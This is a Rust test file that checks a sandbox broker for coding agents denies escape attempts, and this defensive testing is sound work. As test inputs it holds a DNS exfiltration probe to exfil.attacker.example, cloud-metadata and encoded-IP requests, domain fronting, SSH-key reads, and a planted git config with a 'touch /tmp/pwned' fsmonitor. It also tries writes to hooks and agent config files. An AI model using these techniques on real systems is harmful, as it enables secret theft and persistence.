//! M0 conformance categories 3, 4, 5, 9 and 10 (Conformance Probe Matrix),
//! run through real `broker run` sessions on the host backend.
//! Each out-of-policy probe must be denied (and network denies logged with
//! the expected reason); each category has an in-policy control.

use audit::Reason;
use conformance::*;

fn assert_denied(r: &ProbeResult, what: &str) {
    assert!(
        r.denied(),
        "{what}: expected DENIED, got code {} stdout={} stderr={}",
        r.code,
        r.stdout.trim(),
        r.stderr.trim()
    );
}

fn assert_allowed(r: &ProbeResult, what: &str) {
    assert!(
        r.allowed(),
        "{what}: expected ALLOWED, got code {} stdout={} stderr={}",
        r.code,
        r.stdout.trim(),
        r.stderr.trim()
    );
}

fn upstream_harness(extra: &str) -> (Harness, Upstream) {
    let up = Upstream::start();
    let h = Harness::new(&config_with_upstream(up.port, extra));
    (h, up)
}

/// The in-policy control every category shares: the granted upstream is
/// reachable through both ingress modes.
fn control(h: &Harness, up: &Upstream) {
    let p = up.port.to_string();
    assert_allowed(&h.probe(&["proxy", "connect", "allowed.test", &p, "allowed.test"]), "control via CONNECT");
    assert_allowed(&h.probe(&["proxy", "socks5", "allowed.test", &p, "allowed.test"]), "control via SOCKS5");
}

#[test]
fn cat03_name_resolution() {
    let (h, up) = upstream_harness("[[egress]]\nhost = \"dns.google\"\n");
    control(&h, &up);
    // No resolver inside the sandbox: libc resolution, UDP/53, TCP/53 (TXT) all fail.
    assert_denied(&h.probe(&["dns", "example.com"]), "libc name resolution");
    assert_denied(&h.probe(&["dns-udp", "8.8.8.8", "exfil.attacker.example", "16"]), "DNS TXT over UDP/53");
    assert_denied(&h.probe(&["dns-tcp", "8.8.8.8", "exfil.attacker.example", "16"]), "DNS over TCP/53");
    assert_denied(&h.probe(&["tcp", "1.1.1.1", "853"]), "DoT");
    // DoH endpoints are blocked by name even when a grant names them.
    assert_denied(&h.probe(&["proxy", "connect", "dns.google", "443", "dns.google"]), "DoH");
    // Data in query names never leaves: the name is not admitted, so never resolved.
    assert_denied(
        &h.probe(&["proxy", "connect", "c2VjcmV0LXRva2Vu.exfil.attacker.example", "443", "-"]),
        "query-name exfil",
    );
    let reasons = h.deny_reasons();
    assert!(reasons.contains(&Reason::DohEndpoint), "{reasons:?}");
    assert!(reasons.contains(&Reason::HostNotAllowed), "{reasons:?}");
}

#[test]
fn cat04_ip_literals_and_encodings() {
    let (h, up) = upstream_harness(
        "[[egress]]\nhost = \"meta.test\"\naddrs = [\"169.254.169.254\"]\n\n[[egress]]\nhost = \"intranet.test\"\naddrs = [\"10.1.2.3\"]\n",
    );
    control(&h, &up);
    let cases: &[(&str, Reason)] = &[
        ("169.254.169.254", Reason::IpLiteral),
        ("2130706433", Reason::AmbiguousIpLiteral),
        ("0x7f000001", Reason::AmbiguousIpLiteral),
        ("0177.0.0.1", Reason::AmbiguousIpLiteral),
        ("127.1", Reason::AmbiguousIpLiteral),
        ("0xa9fea9fe", Reason::AmbiguousIpLiteral),
        ("[::ffff:169.254.169.254]", Reason::MappedV6),
        ("[::1]", Reason::IpLiteral),
        ("8.8.8.8", Reason::IpLiteral),
    ];
    for (host, want) in cases {
        for mode in ["connect", "socks5"] {
            let r = h.probe(&["proxy", mode, host, "443", "-"]);
            assert_denied(&r, &format!("{host} via {mode}"));
            assert!(r.stdout.contains(want.as_str()) || mode == "socks5", "{host} via {mode}: {}", r.stdout);
        }
    }
    // Policy applies to the address the broker resolved, not the name sent.
    assert_denied(&h.probe(&["proxy", "connect", "meta.test", "443", "meta.test"]), "name -> metadata address");
    assert_denied(&h.probe(&["proxy", "socks5", "intranet.test", "443", "intranet.test"]), "name -> RFC1918 address");
    let reasons = h.deny_reasons();
    for want in
        [Reason::IpLiteral, Reason::AmbiguousIpLiteral, Reason::MappedV6, Reason::MetadataAddr, Reason::PrivateAddr]
    {
        assert!(reasons.contains(&want), "missing {want:?} in {reasons:?}");
    }
}

#[test]
fn cat05_alternate_protocols() {
    let (h, up) = upstream_harness("[[egress]]\nhost = \"github.com\"\naddrs = [\"140.82.112.3\"]\n");
    control(&h, &up);
    let p = up.port.to_string();
    assert_denied(&h.probe(&["tcp", "1.1.1.1", "443"]), "raw TCP");
    assert_denied(&h.probe(&["udp", "1.1.1.1", "443"]), "QUIC / UDP 443");
    assert_denied(&h.probe(&["icmp", "1.1.1.1"]), "ICMP");
    assert_denied(&h.probe(&["proxy", "connect", "github.com", "22", "-"]), "SSH port through the proxy");
    assert_denied(&h.probe(&["proxy", "connect", "allowed.test", &p, "raw"]), "non-TLS bytes in an allowed tunnel");
    assert_denied(&h.probe(&["proxy", "connect", "allowed.test", &p, "socks"]), "nested SOCKS in an allowed tunnel");
    assert_denied(
        &h.probe(&["proxy", "connect", "allowed.test", &p, "evil.example"]),
        "domain fronting (SNI != CONNECT)",
    );
    let reasons = h.deny_reasons();
    for want in [Reason::PortNotAllowed, Reason::SniLess, Reason::ConnectSniMismatch] {
        assert!(reasons.contains(&want), "missing {want:?} in {reasons:?}");
    }
}

#[test]
fn cat09_proxy_bypass() {
    let (h, up) = upstream_harness("");
    control(&h, &up);
    let tcp = HostTcp::start();
    let udp = HostUdp::start();
    let sock = HostUnix::start();
    assert_denied(&h.probe(&["tcp", "127.0.0.1", &tcp.port.to_string()]), "host loopback TCP service");
    assert_denied(&h.probe(&["tcp", "1.1.1.1", "443"]), "direct socket ignoring proxy variables");
    let _ = h.probe(&["udp", "127.0.0.1", &udp.port.to_string()]);
    assert_denied(&h.probe(&["unix", &sock.path.display().to_string()]), "host Unix socket (docker.sock stand-in)");
    let ctl = h.home.path().join("run/ctl.sock");
    assert_denied(&h.probe(&["unix", &ctl.display().to_string()]), "brokerd control socket");
    // Client-side proxy overrides change nothing: the sandbox has no other route.
    let r =
        h.probe_with(None, &["tcp", "1.1.1.1", "443"], &[("NO_PROXY", "*"), ("HTTPS_PROXY", ""), ("ALL_PROXY", "")]);
    assert_denied(&r, "direct socket with proxy env cleared by the client");
    std::thread::sleep(std::time::Duration::from_millis(200));
    assert_eq!(tcp.accepts.load(std::sync::atomic::Ordering::SeqCst), 0, "host TCP service was reached");
    assert_eq!(udp.datagrams.load(std::sync::atomic::Ordering::SeqCst), 0, "host UDP service was reached");
    assert_eq!(sock.accepts.load(std::sync::atomic::Ordering::SeqCst), 0, "host Unix socket was reached");
}

/// In-repository agent configuration, created on the host before the
/// session so each write probe hits a real file (I5). A write into a
/// directory that does not exist fails with ENOENT whether or not the
/// sandbox protects it, which is what these probes used to test on macOS.
const REPO_AGENT_CONFIG: &[&str] = &[
    ".claude/settings.json",
    ".mcp.json",
    ".vscode/settings.json",
    ".envrc",
    ".codex/config.toml",
    ".broker/broker.toml",
];

fn init_repo_with_agent_config(p: &std::path::Path) {
    init_repo(p);
    for f in REPO_AGENT_CONFIG {
        let path = p.join(f);
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(&path, format!("# host copy of {f}\n")).unwrap();
    }
}

#[test]
fn cat10_filesystem() {
    // The secrets directory and the canary home are real host paths the
    // sandbox sees (not the private /tmp of the Linux sandbox), and every
    // probed file exists on the host before the session.
    let secrets = host_tmp("bks.");
    let secrets_dir = secrets.path().canonicalize().unwrap();
    let canary_key = secrets_dir.join("canary-key");
    std::fs::write(&canary_key, "CANARY-SECRET-7f3a").unwrap();
    let cfg = format!("version = 1\n\n[filesystem]\ndeny_read = [\"{}\"]\n", secrets_dir.display());
    let opts = Opts { canary_home: true, ..Default::default() };
    let h = Harness::with_opts(&cfg, &[], init_repo_with_agent_config, opts);
    let repo = h.repo_path();
    let ch = h.canary_home();
    let r = |p: &str| repo.join(p).display().to_string();
    let s = |p: &std::path::Path| p.display().to_string();
    let mut protected: Vec<_> = REPO_AGENT_CONFIG.iter().map(|p| repo.join(p)).collect();
    protected.extend([repo.join(".git/config"), repo.join(".git/hooks/pre-commit"), canary_key.clone()]);
    let before = FileState::of(&protected);
    // Controls: the repository is writable, git commits work, the canary
    // home is visible (so a missing file there would be a fixture bug).
    assert_allowed(&h.probe(&["write", &r("src.txt")]), "write in the repo");
    assert_allowed(&h.probe(&["read", &r("README.md")]), "read in the repo");
    assert_allowed(&h.probe(&["read", &s(&ch.join(CanaryHome::PLAIN))]), "read an unprotected file in the canary home");
    // Secret reads.
    assert_read_denied(&h.probe(&["read", &s(&canary_key)]), &canary_key, "policy deny_read canary");
    let key = ch.join(CanaryHome::SSH_KEY);
    assert_read_denied(&h.probe(&["read", &s(&key)]), &key, "~/.ssh/id_ed25519 (canary home)");
    let home = std::env::var("HOME").unwrap();
    let real_key = std::path::Path::new(&home).join(".ssh/id_ed25519");
    if real_key.is_file() {
        assert_read_denied(&h.probe(&["read", &s(&real_key)]), &real_key, "the user's own ~/.ssh/id_ed25519");
    }
    assert_read_denied(&h.probe(&["read", &s(&h.audit_db())]), &h.audit_db(), "audit log (I9)");
    // Writes to protected names inside the writable repo (I5): each exists,
    // or (a new hook) its directory does.
    for p in [".git/hooks/pre-commit", ".git/config"].iter().chain(REPO_AGENT_CONFIG) {
        assert_fs_denied(&h.probe(&["write", &r(p)]), p);
    }
    assert_fs_denied(&h.probe(&["mkdir", &r(".cursor/rules")]), ".cursor");
    // Writes outside the grants, including `..` traversal.
    assert_fs_denied(
        &h.probe(&["write-new", &format!("{home}/.broker-probe-{}", std::process::id())]),
        "write in $HOME",
    );
    assert_fs_denied(&h.probe(&["write-new", &s(&ch.join(".broker-probe"))]), "new file in the canary home");
    for p in CanaryHome::CONFIG {
        assert_fs_denied(&h.probe(&["write", &s(&ch.join(p))]), &format!("~/{p} (canary home)"));
    }
    let outside = repo.parent().unwrap().join(format!("broker-probe-outside-{}", std::process::id()));
    let dotdot = format!("{}/../{}", repo.display(), outside.file_name().unwrap().to_string_lossy());
    let res = h.probe(&["write-new", &dotdot]);
    // macOS: denied. Linux: /tmp inside the sandbox is a private tmpfs, so the
    // write may succeed there; either way the host path must be untouched.
    assert!(!outside.exists(), "`..` traversal wrote {} on the host: {res:?}", outside.display());
    if cfg!(target_os = "macos") {
        assert_fs_denied(&res, "`..` out of the repo");
    }
    // Link and rename tricks. Linux answers these through its mount table:
    // `.git` is a bind mountpoint (EBUSY to rename) and `.git/config` a
    // read-only bind (EXDEV to rename over or link across).
    assert_denied_or(&h.probe(&["rename", &r(".git"), &r(".gitx")]), "rename .git (replant gitdir)", &["EBUSY"]);
    std::fs::write(repo.join("evil-config"), "[core]\n\tfsmonitor = touch /tmp/pwned\n").unwrap();
    let res = h.probe(&["rename", &r("evil-config"), &r(".git/config")]);
    assert_denied_or(&res, "rename over .git/config", &["EXDEV"]);
    assert_denied_or(&h.probe(&["hardlink", &r(".git/config"), &r("cfg-link")]), "hardlink to .git/config", &["EXDEV"]);
    assert_allowed(&h.probe(&["symlink", &s(&repo.join(".git/hooks")), &r("hooks-link")]), "symlink creation");
    assert_fs_denied(&h.probe(&["write", &r("hooks-link/post-commit")]), "write through a symlink into .git/hooks");
    assert_allowed(&h.probe(&["symlink", &s(&canary_key), &r("secret-link")]), "symlink creation");
    assert_read_denied(&h.probe(&["read", &r("secret-link")]), &canary_key, "read a secret through a symlink");
    // A secret created after the session started is still unreadable (the
    // probe polls through ENOENT until the file appears).
    let late = secrets_dir.join("late-key");
    let child = h.spawn_probe(&["read-when-exists", &s(&late), "5"]);
    std::thread::sleep(std::time::Duration::from_millis(800));
    std::fs::write(&late, "LATE-SECRET").unwrap();
    let out: ProbeResult = child.wait_with_output().unwrap().into();
    assert_read_denied(&out, &late, "a secret created after the session started");
    // Nothing on the host changed, and nothing new is left behind (Linux
    // placeholders for absent protected names are removed at teardown).
    before.assert_same(&FileState::of(&protected), "repository config and secrets");
    ch.assert_unchanged();
    for p in [".cursor", ".gitx", "cfg-link", "hooks-link/post-commit"] {
        assert!(!repo.join(p).exists(), "{p} left in the repository after the session");
    }
}

#[test]
fn cat10_absent_protected_names_cannot_be_created() {
    // A protected name missing from the repository cannot be created: macOS
    // refuses the create, Linux binds an empty read-only placeholder there
    // for the session. `mkdir <name>/x` is refused on both, strictly.
    let h = Harness::new("version = 1\n");
    let repo = h.repo_path();
    let names = [".claude", ".mcp.json", ".codex", ".cursor", ".gemini", ".vscode", ".idea", ".envrc", ".broker"];
    for name in names {
        assert!(!repo.join(name).exists(), "fixture: {name}");
        assert_fs_denied(&h.probe(&["mkdir", &repo.join(name).join("x").display().to_string()]), name);
        // On Linux the placeholder is a directory, so creating a file of that
        // name is EEXIST, not a refusal; the mkdir above covers Linux.
        if cfg!(target_os = "macos") {
            assert_fs_denied(&h.probe(&["write-new", &repo.join(name).display().to_string()]), name);
        }
    }
    for name in names {
        assert!(!repo.join(name).exists(), "{name} left in the repository after the session");
    }
}

#[test]
fn cat10_non_repo_directory_cannot_grow_git_hooks() {
    // In a directory that is not a repository, the agent must not be able to
    // create `.git/hooks` that the user's next unsandboxed git would run.
    let h = Harness::new("version = 1\n");
    let repo = h.repo_path();
    std::fs::remove_dir_all(repo.join(".git")).unwrap();
    let r = h.probe(&["mkdir", &repo.join(".git/hooks").display().to_string()]);
    assert_fs_denied(&r, "mkdir .git/hooks outside a repository");
    assert!(!repo.join(".git/hooks").exists());
    assert!(!repo.join(".git").exists(), "placeholder removed at teardown");
}

#[test]
fn cat10_git_commit_still_works() {
    let h = Harness::new("version = 1\n");
    if std::process::Command::new("git").arg("--version").output().is_err() {
        return;
    }
    let repo = h.repo_path();
    std::fs::write(repo.join("a.txt"), "a\n").unwrap();
    let r = h.run_argv(
        None,
        &[
            "/bin/sh".into(),
            "-c".into(),
            "git add a.txt && git -c user.email=a@b -c user.name=probe -c commit.gpgsign=false commit -q -m probe"
                .into(),
        ],
        &[],
    );
    assert_eq!(r.code, 0, "local commit inside the sandbox: {r:?}");
}

/// R16 (macOS): every session may write the per-user temp dir (ADR-016),
/// but not another session's `broker-*` scratch in it; its own `TMPDIR`
/// stays writable.
#[cfg(target_os = "macos")]
#[test]
fn cat10_other_sessions_scratch_is_not_writable() {
    let out = std::process::Command::new("/usr/bin/getconf").arg("DARWIN_USER_TEMP_DIR").output().unwrap();
    let shared = std::path::PathBuf::from(String::from_utf8(out.stdout).unwrap().trim()).canonicalize().unwrap();
    let other = tempfile::Builder::new().prefix("broker-other-").tempdir_in(&shared).unwrap();
    let victim = other.path().join("script.sh");
    std::fs::write(&victim, "echo original\n").unwrap();
    let h = Harness::new("version = 1\n");
    let s = |p: &std::path::Path| p.display().to_string();
    assert_fs_denied(&h.probe(&["write", &s(&victim)]), "append to another session's scratch file");
    assert_fs_denied(&h.probe(&["write-new", &s(&other.path().join("planted"))]), "plant a file there");
    assert_fs_denied(&h.probe(&["mkdir", &s(&shared.join("broker-new-by-agent"))]), "create a broker-* dir");
    assert_eq!(std::fs::read_to_string(&victim).unwrap(), "echo original\n");
    assert!(!other.path().join("planted").exists());
    // Controls: its own TMPDIR, and the rest of the shared dir (ADR-016).
    let r = h.sh("echo x > \"$TMPDIR/own\" && echo OWN");
    assert!(r.stdout.contains("OWN"), "{r:?}");
    let name = format!("xcrun-like-{}", std::process::id());
    assert!(h.probe(&["write-new", &s(&shared.join(&name))]).allowed(), "ADR-016 residual");
    let _ = std::fs::remove_file(shared.join(&name));
}

/// ADR-046: nothing the session writes can repoint git's config or hooks:
/// `commondir`, `config.worktree`, submodule and linked-worktree git
/// directories are refused; a nested repository is refused (macOS) or
/// quarantined at teardown (Linux); git itself keeps working.
#[test]
fn cat10_git_cannot_be_pointed_at_agent_written_config() {
    let h = Harness::new("version = 1\n");
    let repo = h.repo_path();
    let r = |p: &str| repo.join(p).display().to_string();
    assert_fs_denied(&h.probe(&["write", &r(".git/commondir")]), ".git/commondir");
    assert_fs_denied(&h.probe(&["write", &r(".git/config.worktree")]), ".git/config.worktree");
    assert_fs_denied(&h.probe(&["mkdir", &r(".git/modules/lib")]), "a submodule's git directory");
    assert_fs_denied(&h.probe(&["mkdir", &r(".git/worktrees/x")]), "a linked worktree's git directory");
    let c = h.sh("git -c user.email=a@b -c user.name=probe -c commit.gpgsign=false commit -q --allow-empty -m x && echo COMMITTED");
    assert!(c.stdout.contains("COMMITTED"), "git still works in the session: {c:?}");
    if cfg!(target_os = "macos") {
        assert_fs_denied(&h.probe(&["mkdir", &r("sub/.git")]), "a nested repository");
    } else {
        let n = h.sh("mkdir -p sub && git init -q sub && echo MADE");
        assert!(n.stdout.contains("MADE"), "{n:?}");
        assert!(!repo.join("sub/.git").exists(), "the session's nested repository is not left in place");
        let moved = std::fs::read_dir(repo.join("sub"))
            .unwrap()
            .flatten()
            .any(|e| e.file_name().to_string_lossy().starts_with(".git.broker-quarantine-"));
        assert!(moved, "it is renamed aside, not deleted");
        let stop = h.events().into_iter().filter(|e| e.kind == audit::EventKind::SessionStop).last().unwrap();
        assert!(stop.detail.contains_key("quarantined_git"), "{:?}", stop.detail);
    }
    // Linux placeholders are gone after the session; nothing was left behind.
    for p in [".git/commondir", ".git/config.worktree", ".git/modules", ".git/worktrees"] {
        assert!(!repo.join(p).exists(), "{p} left in the repository");
    }
}
